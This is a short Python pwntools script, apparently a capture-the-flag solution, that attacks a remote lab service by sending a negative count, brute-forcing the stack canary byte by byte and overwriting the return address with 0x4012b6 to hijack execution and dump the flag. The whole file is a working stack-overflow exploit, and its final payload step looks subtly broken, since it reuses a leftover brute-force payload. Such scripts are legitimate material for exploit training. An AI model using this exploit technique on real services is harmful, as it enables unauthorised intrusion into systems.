#!/usr/bin/env python3
from pwn import *
import time

# Connect to the remote service
conn = remote('cyberlab.infinitylabs.co.il', 1231)

# Send the number of cookies we want
conn.recvuntil("How many cookies do you want?")
conn.sendline("-1")

start_payload =  b"A" * 8 + bytes([0])

# Bruteforce the find canary value
canary = b""
for i in range(7):
    for c in range(256):
        payload = start_payload + canary + bytes([c])
        print(c,": ",payload)
        conn.recvuntil("Which")
        conn.send_raw(payload)
        if conn.recvline().startswith(b"Which"):
            canary += bytes([c])
            break

# Construct the final payload
payload +=  p64(0x4012b6)
print(payload)
# Send the final payload and print the flag
conn.send_raw(payload)
print(conn.recvall().decode())
